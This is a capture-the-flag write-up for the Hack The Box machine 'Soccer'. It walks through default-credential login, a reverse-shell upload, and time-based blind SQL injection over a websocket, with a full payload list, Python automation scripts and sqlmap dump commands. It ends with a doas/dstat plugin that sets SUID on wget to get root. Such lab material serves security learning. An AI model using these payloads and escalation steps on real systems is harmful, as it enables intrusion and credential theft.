# Soccer

<div style=" width : 50% ">
    <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/18fff389-6af8-416b-9414-66638fb192b2" load="lazy"></img>
</div>

Welcome back today we have an easy machine that has a common vulnerability to exploit in a strange way to become user, where we can learn a lot.

So let's start with a usual nmap scan to get started.

```bash
# Nmap 7.93 scan initiated Sat Jun 10 10:08:57 2023 as: nmap -sS -sC -sV -oN scans/nmap.txt 10.10.11.194
Nmap scan report for soccer.htb (10.10.11.194)
Host is up (0.28s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Soccer - Index 
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Sat, 10 Jun 2023 14:09:13 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Sat, 10 Jun 2023 14:09:13 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.93%I=7%D=6/10%Time=64848403%P=x86_64-pc-linux-gnu%r(in
SF:formix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
SF:\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\
SF:nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Op
SF:tions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCo
SF:ntent-Length:\x20139\r\nDate:\x20Sat,\x2010\x20Jun\x202023\x2014:09:13\
SF:x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang
SF:=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</
SF:head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HT
SF:TPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Pol
SF:icy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\
SF:r\nDate:\x20Sat,\x2010\x20Jun\x202023\x2014:09:13\x20GMT\r\nConnection:
SF:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<me
SF:ta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>C
SF:annot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HT
SF:TP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-s
SF:rc\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20
SF:text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Sat,\
SF:x2010\x20Jun\x202023\x2014:09:13\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"u
SF:tf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\
SF:x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
SF:r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 10 10:09:20 2023 -- 1 IP address (1 host up) scanned in 22.99 seconds
```

From here we can simply visit the website

![Untitled](https://github.com/Wanasgheo/Writeups/assets/111740362/0043bc97-84e8-4a6e-b25c-6789902cc678)

Nothing cool here, so we can try to run gobuster to spot some hidden folders

```
┌──(kali㉿kali)-[~/diego/Hack_the_box/Machines/Soccer]
└─$ cat scans/gbusterSecCommon.txt 
/.htaccess            (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
```

There is the `/tiny` page that we can visit where there is a login form

![Untitled(1)](https://github.com/Wanasgheo/Writeups/assets/111740362/55ae54c3-8edf-4b07-ac25-80367e30004c)

By looking at the source code we can find the  used [Framework]( https://github.com/prasathmani/tinyfilemanager) by the site, by looking for it in internet we can spot some defuault credentials that we can try 

![Untitled(2)](https://github.com/Wanasgheo/Writeups/assets/111740362/6d905f4a-bd89-49db-bfee-0de00d1eb019)

That could be even found by searching the version online which will redirect us to an exploit of a CVE

![Untitled(3)](https://github.com/Wanasgheo/Writeups/assets/111740362/2cb93c48-951b-4486-a03a-153cdcaa2bd8)

And if we try to insert them we get the access

![Untitled(4)](https://github.com/Wanasgheo/Writeups/assets/111740362/f872245a-4d3c-42db-bf7f-5135b7fd1290)

Now we have to find a way to get a foothold, here its kinda easy because we just have to upload a reverse shell and open it with the direct-link

![Untitled(5)](https://github.com/Wanasgheo/Writeups/assets/111740362/d1789e3f-e802-4d3a-8940-222df1dca472)

In order to get it we have to change the directory from tiny to uploads where we're allowed to manage files, then we need to listen and open the revshell

![Untitled(6)](https://github.com/Wanasgheo/Writeups/assets/111740362/e038b53f-ae66-41c5-b6e8-4f93747b9819)

Now we are not allowed to get the user flag, so we got to privesc to `player`

![Untitled(7)](https://github.com/Wanasgheo/Writeups/assets/111740362/c7c62776-46c4-4253-8ed5-72cbe61dbd51)

From the error page we see  the webserver's version which is `nginx`

![Untitled(8)](https://github.com/Wanasgheo/Writeups/assets/111740362/45e11fa8-159b-44be-9392-54fc150a11c8)

So we can check to the root folder of it or the `/etc/nginx` if we can find some interesting stuffs.

Like from the `/etc/nginx/sites-enabled/` where we can find an interesting file or `soc-player.htb`, a new `sub-domain`

```bash
(remote) www-data@soccer:/etc/nginx/sites-enabled$ cat soc-player.htb 
server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}
```

In order to visit the new sub-domain we need to add it next to the one we added before in the `/etc/hosts`.

![Untitled(9)](https://github.com/Wanasgheo/Writeups/assets/111740362/00e932c5-12f7-456b-92d5-07b7189a718b)

From there we can see that we are allowed to register and then login.

![Untitled(10)](https://github.com/Wanasgheo/Writeups/assets/111740362/839f2ae1-bab2-4b8b-9415-4783c19a8e66)

We get redirected to the tickets page where we can’t do more but we can spot from  the source code that we are on a `websocket`

![Untitled(29)](https://github.com/Wanasgheo/Writeups/assets/111740362/4e04a437-cb5f-4ca6-8f48-5b221c6518e7)

Being in a websocket means that to interact with it we have to create a special code in python that let us to comunicate with it or either use burpsuite with a special request.

```python
import asyncio
import websockets

async def connect_websocket():
    async with websockets.connect("ws://soc-player.soccer.htb:9091/") as websocket:
        print("WebSocket connection established.")
        
        while True:

            wordlist = ""

            with open(wordlist) as list:

            message = input("Enter a message to send (or 'exit' to quit): ")
            message = '{"id":' + f'"{message}"' + "}"
            print(message)
            
            if message.lower() == 'exit':
                break
            
            await websocket.send(message)
            print("Message sent.")
            
            response = await websocket.recv()
            print("Received message:", response)
    
    print("WebSocket connection closed.")

asyncio.run(connect_websocket())
```

Here we created a code in async to make it  faster but it is not necessary, and if we run it here is result that we get via bash

![image](https://github.com/Wanasgheo/Writeups/assets/111740362/9709b459-4761-4465-9c4e-bde99563ceb9)

Like this we’ve established a comunication with the ws, and now we can try to check if it is vulnerable to something like the `SQL Injection`.
After some tests we see that there are no error messages so we have to exploit it with time-based payloads.

This is the used [wordlist](https://github.com/payloadbox/sql-injection-payload-list#generic-time-based-sql-injection-payloads) to spot the vuln

```plaintext
sleep(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
" or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
1) or benchmark(10000000,MD5(1))#
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
")) or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#
pg_sleep(5)--
1 or pg_sleep(5)--
" or pg_sleep(5)--
' or pg_sleep(5)--
1) or pg_sleep(5)--
") or pg_sleep(5)--
') or pg_sleep(5)--
1)) or pg_sleep(5)--
")) or pg_sleep(5)--
')) or pg_sleep(5)--
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)='
or SLEEP(5)
or SLEEP(5)#
or SLEEP(5)--
or SLEEP(5)="
or SLEEP(5)='
waitfor delay '00:00:05'
waitfor delay '00:00:05'--
waitfor delay '00:00:05'#
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))--
benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))--
or benchmark(50000000,MD5(1))#
pg_SLEEP(5)
pg_SLEEP(5)--
pg_SLEEP(5)#
or pg_SLEEP(5)
or pg_SLEEP(5)--
or pg_SLEEP(5)#
'\"
AnD SLEEP(5)
AnD SLEEP(5)--
AnD SLEEP(5)#
&&SLEEP(5)
&&SLEEP(5)--
&&SLEEP(5)#
' AnD SLEEP(5) ANd '1
'&&SLEEP(5)&&'1
ORDER BY SLEEP(5)
ORDER BY SLEEP(5)--
ORDER BY SLEEP(5)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+benchmark(3200,SHA1(1))+'
+ SLEEP(10) + '
RANDOMBLOB(500000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
RANDOMBLOB(1000000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

After this we have to change a bit the source code to make it send all the lines as input, with the goal to trigger some vulns

```python
import asyncio
import websockets

async def connect_websocket():
    async with websockets.connect("ws://soc-player.soccer.htb:9091/") as websocket:
        print("WebSocket connection established.")
        
        while True:

            wordlist = "timeBasedPayloads.txt"

            with open(wordlist, "r") as list:

                for payload in list:
                    message = payload.strip()
                    message = '{"id":' + f'"{message}"' + "}"
                    print(message)
                    
                    if message.lower() == 'exit':
                        break
                    
                    await websocket.send(message)
                    print("Message sent.")
                    
                    response = await websocket.recv()
                    print("Received message:", response)
    
    print("WebSocket connection closed.")

asyncio.run(connect_websocket())
```

Here is the result

![Untitled(28)](https://github.com/Wanasgheo/Writeups/assets/111740362/b0d372c6-d320-48bd-9f64-e814c2098f2d)

As you can see with the input `{"id":"sleep(5)"#}` we get the desired delay of 5 second and same for next input or `{"id":"1 or sleep(5)#"}`.

Now that we know it, we can try to use sqlmap to make it extract all the informations, the only problem is that we can’t simply insert the `URL` as a `POST` request, so we have two ways that we can follow.

We can either use only Sqlmap, or use this code provided by a user on [github](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)

MIddleWare Server

```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://soc-player.soccer.htb:9091"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"id":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()

print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass
```

Here we change the real cookie with the one that we need or `{'id':'*'}` , like this we can run the server from a terminal and then run sqlmap from the other by using `http://localhost:8081/?id=1` as url

Like this we can extract whatever we want

```bash
# [0] zsh
python3 WebSocketSQLi.py
# [1] zsh
sqlmap -u "http://localhost:8081/?id=*" -p "id" -o --batch --dump --thread 30
```
Here is the result

![Untitled(13)](https://github.com/Wanasgheo/Writeups/assets/111740362/11b755ed-69cf-4634-8bb8-eb8a5864f0b3)


Instead we could only use Sqlmap by specifying the argument that we want to pass through the request with the `--data` flag and specifying the cookie we like.

```python
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 50 --level 5 --risk 3 --batch --dump
```

Here we added:

- `--thread` To specify the number of threads to use, because by default is 1, and the max is 10 so we changed it from the source code to a max o 50
  
    ![Untitled(18)](https://github.com/Wanasgheo/Writeups/assets/111740362/517be57d-8bb0-4248-87ef-346cdb2a0420)

- `--level 5` Or the max level of deepness to make it try all the possible payloads
- `--risk 3` Even here the max level for more precision
- `--batch` This will answer `Yes` to every proposed question by sqlmap
- `--dump` To make it dump the `tables`

WIth this query we can retrieve the desired content, by adding the Database and the Table

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads --level 5 --risk 3 --batch -D soccer_db -T accounts --dump
```

Here are the creds for the user player.

![Untitled(14)](https://github.com/Wanasgheo/Writeups/assets/111740362/d80e6ef3-99bb-4762-a5ac-f2baf79e9e78)

It turned out that password is the one of the `ssh` connection.

![Untitled(15)](https://github.com/Wanasgheo/Writeups/assets/111740362/b4152400-610b-4afb-b28a-170d2340dda4)

Now we can finally fetch the `user.txt` flag

## Root.txt

After the user we have to escalate to root, for this reason we got to fetch `linpeas.sh`, via python3 web-server

![Untitled(16)](https://github.com/Wanasgheo/Writeups/assets/111740362/cae066e9-9441-4b5a-86b0-29ba9f62d99c)

By running it we can see that there is a strange command that we can run with the `SUID` bit set, or `doas`

![Untitled(17)](https://github.com/Wanasgheo/Writeups/assets/111740362/dd58ce76-dd56-4b9a-bdf8-dc6bd52302fd)

As you can see it is not highlited by linpeas but it can be used to become root, because in it are stored the command that some users can run without password as other users

By looking at the `doas.conf` file we can see this specifications

![Untitled(19)](https://github.com/Wanasgheo/Writeups/assets/111740362/e21a39c3-138e-4d9d-8a5c-791639fad027)

Here we can see that we’re allowed to run the command `/usr/bin/dstat` as root without any password which, even this, is a command that can lead to a shell if we can run it as sudo. Basically it is used to see an overview of systems in real-time.

So to get the root instead of using `sudo` we will use `doas` which does the same work as it; so by looking at this [link](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/) or even [gtfobins](https://gtfobins.github.io/gtfobins/dstat/#shell), we can simply add the `s` bit to a command to become root.

![Untitled(20)](https://github.com/Wanasgheo/Writeups/assets/111740362/22249f38-3110-4f1e-b0d9-b57cc38d482c)

The idea is simple we got to create a new plugin that we can insert in the `/usr/local/share/dstat` folder, where the command fetch the python files, as you can see below.

![Untitled(21)](https://github.com/Wanasgheo/Writeups/assets/111740362/54f0c075-6ebd-4f19-8537-d9e76cb5e64a)

So we simply have to create a python script that add the `s` bit to a command and then run it with doas

```bash
echo 'import os; os.system("chmod +s /usr/bin/wget")' > /usr/local/share/dstat/dstat_giveMeRoot.py
```

To check if it worked we can use the command `dstat --list`

![Untitled(22)](https://github.com/Wanasgheo/Writeups/assets/111740362/773fe794-86eb-44ca-b3d9-530b5ba3577d)

The plugin got added so now we can run it as `root` with `doas`

![Untitled(23)](https://github.com/Wanasgheo/Writeups/assets/111740362/33c4987b-0598-431d-97bb-9dd82b81cbcc)

Don’t worry about the error it worked anyway, as you can see  by checking the permission of `wget`

![Untitled(24)](https://github.com/Wanasgheo/Writeups/assets/111740362/22c9b103-14cc-4bd9-b716-0e43cbcd04b4)

So now we just have to follow the instruction of `[gtfobins](https://gtfobins.github.io/gtfobins/wget/#sudo)` to become root with `wget`.

![Untitled(25)](https://github.com/Wanasgheo/Writeups/assets/111740362/e341c10c-d3f8-4f44-b5fd-b57d075a14e7)

By running these commands.

![Untitled(26)](https://github.com/Wanasgheo/Writeups/assets/111740362/c403ed64-b43b-44a0-a32a-21dc950d7773)

And we are root so now we can fetch even the `root` flag

We did it!

![Untitled(27)](https://github.com/Wanasgheo/Writeups/assets/111740362/de6902cd-2f32-466f-9963-236d41e7f988)
